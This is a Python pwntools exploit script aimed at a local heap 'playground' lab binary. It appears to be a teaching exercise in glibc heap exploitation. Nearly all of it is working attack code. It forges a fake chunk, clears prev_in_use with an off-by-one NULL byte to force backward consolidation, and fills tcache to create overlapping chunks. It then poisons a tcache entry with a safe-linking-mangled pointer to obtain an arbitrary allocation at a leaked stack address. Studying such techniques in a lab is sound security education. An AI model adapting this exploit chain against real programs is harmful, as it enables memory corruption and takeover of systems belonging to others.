#!/usr/bin/env python3

import pwn
import sys

BIN_FILENAME = "/lab/bin/playground"

gdbscript = """
    set resolve-heap-via-heuristic force
    continue
"""


def protect_ptr(heap_addr, ptr):
    return (heap_addr >> 12) ^ ptr


def exploit(p):
    print("getting leaks")
    p.recvuntil(b"[*] stack ")
    stack_ptr = int(p.recvline()[:-1], 16)
    print(f"  stack_ptr: {stack_ptr:#x} (this is our target address)")
    p.recvuntil(b"[*] global ")
    data_ptr = int(p.recvline()[:-1], 16)
    print(f"  data_ptr: {data_ptr:#x}\n")

    if "--pdb" in sys.argv:
        breakpoint()

    print("create a_alloc to forge a fake chunk")
    p.clean()
    p.sendline(b"malloc 0x38")
    p.recvuntil(b"[*] ")
    a_ptr = int(p.recvline()[:-1], 16)
    print(f"  a_ptr({a_ptr:#x}) = malloc(0x38)\n")

    print(f"create b_alloc to overflow a NULL byte into the metadata of the next chunk")
    p.clean()
    p.sendline(b"malloc 0x28")
    p.recvuntil(b"[*] ")
    b_ptr = int(p.recvline()[:-1], 16)
    print(f"  b_ptr({b_ptr:#x}) = malloc(0x28)\n")

    print(f"create c_alloc, this one will be corrupted from b_ptr")
    p.clean()
    p.sendline(b"malloc 0xf8")
    p.recvuntil(b"[*] ")
    c_ptr = int(p.recvline()[:-1], 16)
    print(f"  c_ptr({c_ptr:#x}) = malloc(0xf8)\n")

    print(f"now use b_ptr to corrupt c_alloc metadata:")
    print(f"  - overwrite prev_size")
    print(f"  - use off-by-one error to clear its prev_in_use flag with a NULL byte")
    fake_prev_size = (c_ptr - 8*2) - a_ptr
    b_chunk_size = 0x28
    payload = (
        b"b" * (b_chunk_size - 8) + # padding
        pwn.p64(fake_prev_size) +   # prev_size
        b"\x00"                     # clears prev_in_use
    )
    p.sendline(f"write {b_ptr:#x} {len(payload):#x}".encode())
    p.send(payload)
    print()

    print("write fake chunk at a_ptr with fake size.")
    p.sendline(f"write {a_ptr:#x} {8*4:#x}".encode())
    p.send(
        pwn.p64(0x0) +              # prev_size
        pwn.p64(fake_prev_size) +   # size
        pwn.p64(a_ptr) +            # fd to itself to bypass unlink checks
        pwn.p64(a_ptr)              # bk to itself to bypass unlink checks
    )

    print("at this point c_alloc is corrupted:")
    print("  - cleared its prev_in_use flag, so the allocator will think the prev chunk is free")
    print("  - prev_size is targetting our fake chunk at a_ptr")
    print("  - fake chunk at a_ptr contains a size that matches prev_size")
    print("once we free c_alloc it will consolidate back to our fake chunk at a_ptr\n")

    print("for c_alloc to be consolidated, it cannot go into tcache")
    print("before freeing c_alloc, we need to fill tcache bin 0x100")
    print("create 7 allocations")
    tcache_allocations = []
    for _ in range(7):
        p.clean()
        p.sendline(b"malloc 0xf8")
        p.recvuntil(b"[*] ")
        ptr = int(p.recvline()[:-1], 16)
        tcache_allocations.append(ptr)

    print("fill tcache bin 0x100")
    for current in tcache_allocations:
        p.sendline(f"free {current:#x}".encode())
    print()

    print("free c_alloc to consolidate back to the fake chunk at a_ptr")
    p.sendline(f"free {c_ptr:#x}".encode())
    print("our malicious chunk has a size of 0x160 after consolidating back and is placed in unsorted bins\n")

    print("let's request 0x158 bytes for the allocator to return it")
    p.clean()
    p.sendline(b"malloc 0x158")
    p.recvuntil(b"[*] ")
    d_ptr = int(p.recvline()[:-1], 16)
    print(f"  d_ptr({d_ptr:#x}) = malloc(0x158)\n")

    print(f"overlap created:")
    print(f"  - b_ptr: {b_ptr:#x} - {b_ptr+0x28:#x}")
    print(f"  - d_ptr: {d_ptr:#x} - {d_ptr+0x158:#x}\n")

    print("alloc a chunk and free it into tcache bin 0x30")
    print("this is a placeholder for the tcache entry to be poisoned")
    p.clean()
    p.sendline(b"malloc 0x28")
    p.recvuntil(b"[*] ")
    placeholder_ptr = int(p.recvline()[:-1], 16)
    p.sendline(f"free {placeholder_ptr:#x}".encode())
    print("tcache [0x30]: placeholder_alloc\n")

    print("now we free b_ptr")
    p.sendline(f"free {b_ptr:#x}".encode())
    print(f"tcache [0x30]: b_alloc -> placeholder_alloc")
    print(f"ready to perform tcache poisoning through d_ptr\n")

    print(f"using overlap from d_ptr to overwrite b_alloc->fd")
    fake_fd = protect_ptr(d_ptr, stack_ptr)
    pad = b_ptr - d_ptr
    p.sendline(f"write {d_ptr:#x} {pad + 8:#x}".encode())
    payload = b"d" * pad + pwn.p64(fake_fd)
    p.send(payload)
    print(f"tcache [0x30]: b_alloc -> malicious_address\n")

    print("malloc first time. will return b_alloc. we discard it")
    p.sendline(b"malloc 0x28")
    print("malloc second time to return the malicious allocation")
    p.clean()
    p.sendline(b"malloc 0x28")
    p.recvuntil(b"[*] ")
    evil_ptr = int(p.recvline()[:-1], 16)
    print(f"arbitrary allocation achieved: {evil_ptr:#x}\n")
    

def main():
    if "--gdb" in sys.argv:
        p = pwn.gdb.debug(
            BIN_FILENAME,
            env={},
            gdbscript=gdbscript
        )
    else:
        p = pwn.process(BIN_FILENAME, env={})

    exploit(p)
    p.interactive()


if __name__ == "__main__":
    main()
